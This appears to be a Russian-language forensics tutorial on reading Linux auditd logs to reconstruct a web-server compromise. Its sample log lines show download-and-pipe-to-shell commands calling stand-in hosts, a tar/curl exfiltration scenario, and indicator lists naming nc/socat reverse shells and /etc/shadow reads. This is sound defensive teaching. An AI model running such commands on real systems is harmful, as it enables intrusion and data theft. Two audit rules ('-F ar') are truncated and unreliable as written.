## Вопрос, с которого всё начинается

На Linux-сервере что-то произошло, но прикладные логи молчат. Нужен след уровня ядра: кто
запускал процессы, какие файлы открывались, кто менял права. Ответ даёт **auditd** —
подсистема аудита Linux, которая пишет события в `audit.log`.

## Наш пример: подозрительная цепочка

У нас фрагмент `/var/log/audit/audit.log`:

```
type=SYSCALL msg=audit(1746086401.123:101): arch=c000003e syscall=59 success=yes \
exe="/usr/bin/curl" key="recon" pid=2211 uid=33
type=EXECVE msg=audit(1746086401.123:101): argc=4 a0="curl" a1="-s" \
a2="http://198.51.100.9/p.sh" a3="-o"
```

Разберём, что здесь написано, и как из таких строк собрать историю атаки.

## Что такое auditd и правила

auditd — демон, который по **правилам** (`/etc/audit/rules.d/*.rules`) перехватывает
системные вызовы (**syscall** — запрос программы к ядру). Правило говорит: «логируй
syscall такой-то с таким-то ключом». Например, правило `-a always,exit -F arch=b64 -S execve
-k exec` пишет каждый запуск программы с ключом `exec`. Ключ (`key=`) — твоя метка, по
которой потом фильтруют события.

## Шаг 1: типы записей

Одно событие может быть разбито на несколько строк разных типов:

| Тип | Что содержит |
|-----|--------------|
| `SYSCALL` | номер вызова, `exe`, `pid`, `uid`, `success`, `key` |
| `EXECVE` | аргументы запуска (`a0`, `a1`, …) |
| `PATH` | пути к файлам, с которыми работал вызов |
| `CWD` | рабочий каталог процесса |
| `PROCTITLE` | полная командная строка |

Объединяет их `msg=audit(<время>:<id>)` — одинаковые время и id принадлежат одному событию.

## Шаг 2: читаем execve

Из `SYSCALL` мы узнаём: сработал syscall 59 (`execve` — запуск программы), процесс запустил
`/usr/bin/curl` под `uid=33` (это `www-data` — веб-сервер!). Из `EXECVE` видим аргументы:
`curl -s http://198.51.100.9/p.sh -o`. Вывод: скомпрометированный веб-процесс скачивает
скрипт с внешнего IP. Следующее событие (id 102) — `/bin/bash /tmp/p.sh` от `uid=0`:
скрипт выполнился уже от root.

## Шаг 3: инструменты

Вручную grep по большому логу неудобен. `ausearch` фильтрует по ключу, пользователю, времени:

```
$ ausearch -k exec -i
```

Флаг `-i` переводит коды в читаемый вид (номера syscall → имена, uid → пользователи).
`aureport` строит сводки:

```
$ aureport --auth            # отчёты аутентификации
$ aureport -x                # исполненные программы
```

`aureport -x` часто сразу показывает аномалии — редкие бинарники, запущенные от необычных
пользователей.

## Шаг 4: что искать

Признаки компромисса в аудите: запуск `curl`/`wget` из веб-процесса; shell (`bash`, `sh`)
с `uid=0` после сетевой активности; `nc`/`socat` с флагом reverse (`-e`); чтение `/etc/shadow`
(`syscall=2` — `open`); `chmod +x` на файл в `/tmp`. Цепочка «recon → exec → reverse» в нашем
примере — это готовый сценарий «веб-shell → скачивание → реверс-шелл → root».

## Шаг 5: ограничения

auditd пишет много и быстро забивает диск, поэтому правила обычно узкие — часть событий
отсутствует. Если аудит не был настроен заранее, восстановить детальную историю сложно: тогда
смотри `/proc`, shell history и системные логи. Зато `auditd` — единственный источник, который
доказывает запуск процесса **на уровне ядра**, и его сложнее подделать, чем прикладной лог.

## Что мы теперь знаем

- auditd логирует syscall по правилам с ключами в `audit.log`.
- Событие = строки `SYSCALL`/`EXECVE`/`PATH` с общим `msg=audit(время:id)`.
- `syscall=59` — `execve` (запуск программы); `EXECVE` даёт аргументы.
- `ausearch -k`/`ausearch -i` и `aureport -x` ускоряют разбор.
- Цепочки curl→bash→nc от необычного uid — сильный индикатор атаки.

## Как писать правила аудита

Аудит бесполезен без правил — по умолчанию он почти ничего не пишет. Базовые правила задают,
**что** перехватывать:

```
-w /etc/passwd -p wa -k passwd_changes
-a always,exit -F ar -S execve -k exec
-a always,exit -F ar -S openat -F exit=-EACCES -k access_denied
```

Первое правило следит за записью (`w`) и изменением атрибутов (`a`) файла `/etc/passwd` с
ключом `passwd_changes`. Второе логирует каждый `execve` (запуск программы) с ключом `exec`.
Третье — неуспешные `openat` (отказы в доступе). Загруженные правила можно посмотреть через
`auditctl -l`. Если правил не было — детального следа не будет, и это ограничение нужно
учитывать при оценке полноты картины.

## Разбор случая: компромисс веб-сервера

Полный сценарий по нашим строкам: `uid=33` (`www-data`) запускает `curl` с ключом `recon` —
это веб-процесс скачивает скрипт. Через несколько секунд `bash /tmp/p.sh` уже от `uid=0` —
скрипт выполнился с повышением прав. Следом `nc` с ключом `reverse` от root — установка
реверс-шелла. Цепочка восстанавливается **только** потому, что правило `exec` писал каждый
`execve`. Без аудита остались бы разрозненные куски.

## Интеграция с SIEM

auditd пишет в `/var/log/audit/audit.log`, откуда его забирают в SIEM (например, через
`audisp`-плагин). На стороне SIEM строят корреляции: цепочка `execve` от веб-пользователя к
shell — алерт. Но при переносе важно сохранять **все** поля (ключ, uid, exe, путь), иначе
теряется контекст. Для офлайн-анализа удобно `ausearch -i --raw | ...` и последующая
обработка скриптом.

## Мини-практика: найти аномалию

```
$ aureport -x --summary
$ ausearch -ua 33 --start today -i
```

Первый отчёт даёт сводку исполненных программ — ищи редкие бинарники. Второй фильтрует
события по uid веб-пользователя за сегодня. Если веб-процесс запускал `nc`, `curl` или
`bash` — это то, что нужно расследовать. В норме веб-сервер не должен запускать shell.

## Корреляция событий

Одно событие аудита — это группа строк с общим `msg=audit(время:id)`. Связывая события по
времени и `pid`, восстанавливают цепочку: `execve` (запуск) → `openat` (открытие файла) →
`connect` (сетевое соединение) → `write` (запись). Например, `curl` (execve) скачивает
файл (openat с флагом создания) и открывает соединение (connect). Последовательность
syscall для процесса — это его «поведенческий отпечаток».

## Ограничения и производительность

Аудит подробен, но дорог: каждый syscall — запись, а нагрузка на диск растёт линейно.
Поэтому правила делают узкими (только критичные вызовы и файлы). Второе ограничение —
ротация: `/etc/audit/auditd.conf` задаёт `max_log_file` и `num_logs`, старые логи удаляются.
Если инцидент старый, часть записей могла быть перезаписана. Третье — аудит можно
**отключить** (`systemctl stop auditd`, `auditctl -e 0`), и вредонос часто так и делает.
Обнаружение выключенного аудита — само по себе сильный индикатор.

## Разбор случая: эксфильтрация

Представь цепочку: `bash` от root запускает `tar` (архивирование данных), затем `curl` с
`-T` (загрузка файла на сервер). В аудите это видно как `execve /bin/tar` → `openat` на
`/etc` → `execve /usr/bin/curl` с аргументом-URL. Ключ правила `exfil` на `execve` сразу
выделит обе команды. Сопоставив с сетевыми логами, подтверждаешь факт передачи данных.

## Практический чек-лист

- Проверь, был ли аудит включён (`auditctl -s`), и не выключали ли его.
- Ищи запуск shell из сетевых процессов (веб, БД, почта).
- Ищи `nc`/`socat` с `-e` — реверс-шелл.
- Ищи чтение `/etc/shadow` и `chmod +x` в `/tmp`.
- Сопоставь события с journald и сетевыми соединениями.

## Расширенный разбор: восстановление атаки по аудиту

Соберём полный сценарий из разрозненных записей. Начни с поиска всех `execve` от
веб-пользователя за период инцидента:

```
$ ausearch -ua 33 -m EXECVE -ts recent -i
```

Ты получишь список команд, запущенных веб-процессом. В норме их мало (скрипты сайта,
обработчики). Если среди них `bash`, `sh`, `python`, `nc` — это уже подозрительно. Далее
для найденного `pid` запроси все события с этим `pid`:

```
$ ausearch -p 2212 -i
```

Так собирается вся активность процесса: какие файлы открывал, какие соединения открывал,
какие команды порождал. Это и есть реконструкция атаки на уровне ядра — от первичного
выполнения до закрепления. Заверши сопоставлением с journald (контекст входа) и с сетевыми
логами (куда ушли данные), и у тебя будет доказательная цепочка, а не догадка.

## Аудит и целостность улик

Аудит ценен тем, что фиксирует действия на уровне ядра, но и его можно подделать — если у
злоумышленника есть root, он может очистить логи или отключить демон. Поэтому важна
**цепочка хранения**: логи аудита пересылают на удалённый сервер (`audisp-remote`), где их
нельзя изменить локально. При расследовании проверь, не было ли разрыва в нумерации
записей аудита (`auditctl -s` показывает счётчик), и не отключался ли демон в интересующий
интервал. Если логи централизованы — используй их как эталон, а локальные — как
вспомогательные. Так отчёт опирается на данные, которые атакующий не мог подчистить.

## Практика: ausearch и aureport вместо ручного grep

Сырой `audit.log` неудобен: одно событие раскидано по нескольким строкам с общим
`msg=audit(TIME:ID)`. Инструменты `ausearch` и `aureport` собирают их обратно в записи.

```
$ ausearch -ts today -m EXECVE --format text
type=EXECVE msg=audit(1710174921.413:8821): argc=3 a0="sh" a1="-c" a2="curl http://185.10.x.x/a.sh|sh"
```

Показать все события по конкретному пользователю:

```
$ ausearch -ua 33 -ts recent
```

Сводка по типам событий — быстрое «что вообще происходило»:

```
$ aureport --summary
$ aureport --auth            # успешные/неуспешные аутентификации
$ aureport --executable      # какие бинарники запускались
```

`aureport --executable` на заражённом хосте часто сразу выдаёт аномалию: редкий бинарник из
`/tmp` или `/dev/shm` с сотней запусков.

## Чтение ключей правил и разбор по ключу

Правило может нести свой ключ (`-k`), и тогда выборка становится точечной:

```
$ auditctl -w /etc/passwd -p wa -k passwd_changes
$ ausearch -k passwd_changes
```

Ключи превращают хаос в фильтруемый журнал: `-k exec_susp`, `-k net_connect`,
`-k privileged`. При расследовании сначала идут по ключу, а не по всему логу.

## Если не сработало

- **`ausearch` пусто, хотя в логе есть строки.** Часто причина — неверный диапазон `-ts`
  или `-te`; проверьте, в каком часовом поясе пишется лог (`auditd` пишет время события
  как Unix-эпоху, но `ausearch` интерпретирует локально).
- **Событие «разорвано».** Увеличьте `-a`/`--format raw` и ищите по `msg=audit(...:ID)`
  вручную — все строки одного события имеют одинаковый ID.
- **Правило не срабатывает.** Проверьте `auditctl -l` — список активных правил; правила не
  переживают перезагрузку, если не сохранены в `/etc/audit/rules.d/`.
- **Лог переполнен.** `auditd` при заполнении диска может ротировать или останавливаться
  (`-f 2` — паника). Смотрите `aureport --failed` и параметры в `auditd.conf`.

## Аудит производительности правил

Каждое правило стоит ресурсов на каждый системный вызов. Правило на `-S all` на горячем
сервере способно положить машину. Держите правила узкими: конкретный файл, конкретный
`syscall`, конкретный пользователь. При расследовании уже случившегося аналитик читает то,
что успело записаться; если правило было слишком широким и лог ротировался — часть событий
уже утеряна, и это нужно честно указать в отчёте как пробел в покрытии.

## Куда дальше

Дальше — бинарный журнал `journald`, который systemd пишет вместо текстовых логов. Там другой
формат, но та же задача: найти след. Главное запомни: **auditd — это след уровня ядра, самый
трудно подделываемый источник на Linux**.

## Где пригодится

- DFIR на Linux: восстановление цепочки атаки на уровне syscall.
- CTF-категория Forensics с дампом `/var/log/audit`.
- Threat hunting: правила аудита на критичные операции.
